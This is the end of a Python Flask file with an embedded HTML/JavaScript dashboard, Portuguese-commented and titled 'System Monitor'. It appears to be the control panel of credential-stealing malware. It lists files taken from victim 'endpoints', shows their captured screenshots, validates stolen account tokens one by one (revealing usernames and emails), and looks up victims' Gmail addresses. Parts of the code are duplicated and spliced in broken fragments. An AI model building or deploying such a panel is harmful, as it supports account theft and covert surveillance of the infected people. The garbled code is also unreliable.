                    ${files.length > 0 ? files.map(f => `<div class="token-card"><strong>Nome:</strong> ${f.name || f.filename}<br><strong>Tamanho:</strong> ${f.size ? (f.size / 1024).toFixed(2) + ' KB' : 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhum arquivo encontrado</div>'}
                </div>
            `;
            
            // Valida tokens após abrir o modal
            if (tokens.length > 0) {
                validateTokensInModal();
            }
        }

        function closeModal() {
            document.getElementById('dataModal').style.display = 'none';
        }
        
        async function validateTokensInModal() {
            const tokenCards = document.querySelectorAll('.token-card');
            const statusDiv = document.getElementById('tokenValidationStatus');
            let validCount = 0;
            
            statusDiv.textContent = 'Validando tokens...';
            
            for (let i = 0; i < tokenCards.length; i++) {
                const card = tokenCards[i];
                const token = card.getAttribute('data-token');
                
                card.style.background = 'rgba(59, 130, 246, 0.1)';
                card.innerHTML = `${token}<br><small>Validando...</small>`;
                
                try {
                    const validation = await validateToken(token);
                    
                    if (validation.valid) {
                        card.style.background = 'rgba(34, 197, 94, 0.1)';
                        card.style.border = '1px solid #22c55e';
                        card.innerHTML = `
                            <strong>✅ VÁLIDO</strong><br>
                            ${token}<br>
                            <small>👤 ${validation.username}#${validation.discriminator}</small><br>
                            <small>📧 ${validation.email}</small>
                        `;
                        validCount++;
                    } else {
                        card.style.background = 'rgba(239, 68, 68, 0.1)';
                        card.style.border = '1px solid #ef4444';
                        card.innerHTML = `
                            <strong>❌ INVÁLIDO</strong><br>
                            ${token}
                        `;
                    }
                } catch (error) {
                    card.style.background = 'rgba(239, 68, 68, 0.1)';
                    card.style.border = '1px solid #ef4444';
                    card.innerHTML = `
                        <strong>❌ ERRO</strong><br>
                        ${token}
                    `;
                }
                
                // Pequeno delay para não sobrecarregar a API
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            statusDiv.innerHTML = `<strong>Validação concluída: ${validCount}/${tokenCards.length} tokens válidos</strong>`;
        }
        
        async function checkGmails(endpointId) {
            try {
                // Mostra loading
                const btn = event.target;
                const originalText = btn.textContent;
                btn.textContent = '🔄 Buscando...';
                btn.disabled = true;
                
                const response = await fetch(`/api/check_gmails/${endpointId}`);
                const data = await response.json();
                
                if (data.status === 'success') {
                    alert(`📧 Gmails encontrados: ${data.gmails.length}\n\n${data.gmails.slice(0, 3).map(g => `• ${g.username}@gmail.com`).join('\n')}${data.gmails.length > 3 ? `\n... e mais ${data.gmails.length - 3}` : ''}`);
                    
                    // Atualiza o endpoint para mostrar os Gmails
                    loadEndpoints();
                } else {
                    alert('❌ Erro ao buscar Gmails: ' + data.message);
                }
            } catch (error) {
                alert('❌ Erro na requisição');
            } finally {
                // Restaura botão
                btn.textContent = originalText;
                btn.disabled = false;
            }
        }

        async function loadScreenshots() {
            try {
                const response = await fetch('/api/screenshots');
                const screenshots = await response.json();

                const container = document.getElementById('screenContent');
                container.innerHTML = '';

                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
                    const div = document.createElement('div');
                    div.innerHTML = `
                        <h3 style="color: #a855f7; margin-bottom: 15px;">${endpoint_id}</h3>
                        <p style="color: #9ca3af; margin-bottom: 15px;"><strong>Data:</strong> ${new Date(screenshot.timestamp).toLocaleString()}</p>
                        ${screenshot.image ? `<img src="data:image/png;base64,${screenshot.image}" class="screenshot-img" alt="Screenshot">` : ''}
                    `;
                    container.appendChild(div);
                });

                if (Object.keys(screenshots).length === 0) {
                    container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
                }
            } catch (error) {
                console.error('Error loading screenshots:', error);
            }
        }

        function selectEndpoint() {
            const select = document.getElementById('endpointSelect');
            currentEndpoint = select.value;
            const btn = document.getElementById('screenshotBtn');

            if (currentEndpoint) {
                btn.disabled = false;
                btn.style.opacity = '1';
            } else {
                btn.disabled = true;
                btn.style.opacity = '0.5';
            }
        }

        if (Object.keys(screenshots).length === 0) {
            container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
        }
    } catch (error) {
        console.error('Error loading screenshots:', error);
    }
}

function selectEndpoint() {
    const select = document.getElementById('endpointSelect');
    currentEndpoint = select.value;
    const btn = document.getElementById('screenshotBtn');
            
            // Depois carrega dados de cada endpoint
            const endpoints = await fetch('/api/endpoints').then(r => r.json());
            for (const endpoint of endpoints) {
                await loadEndpointData(endpoint.id);
            }
            
            // Recarrega endpoints com os dados
            await loadEndpoints();
            
            loadScreenshots();
        }

        // Carrega dados iniciais
        loadAllData();

        // Atualiza a cada 30 segundos
        setInterval(loadAllData, 30000);

        // Fecha modal ao clicar fora
        window.onclick = function(event) {
            const modal = document.getElementById('dataModal');
            if (event.target == modal) {
                closeModal();
            }
        }
    </script>
</body>
</html>"""

if __name__ == '__main__':
    print("Iniciando System Monitor RESTAURADO...")
    print("Acessar: https://web-production-49d37.up.railway.app")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
